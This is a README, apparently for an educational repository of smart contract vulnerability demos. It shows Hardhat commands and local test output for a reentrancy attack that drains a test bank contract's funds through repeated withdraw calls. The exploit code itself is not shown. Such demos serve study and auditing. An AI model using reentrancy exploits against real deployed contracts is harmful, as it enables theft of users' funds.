# ContractVulns
A collection of smart contract vulnerability demos and exploit examples

## Reentrancy Attack

```bash
$npx hardhat compile
$npx hardhat run scripts/ReentrancyAttack.js --network localhost
$npx hardhat test test/ReentrancyAttack.js

  Reentrancy Attack
Bank balance before attack: 10.0
Attacker balance before attack: 10000.0
-------------------------------
Number of times `withdraw` has been called: 11n
Bank balance after attack: 0.0
Attacker balance after attack: 10009.999707416496813617
    ✔ should allow reentrancy attack to drain funds from the bank


  1 passing (540ms)
```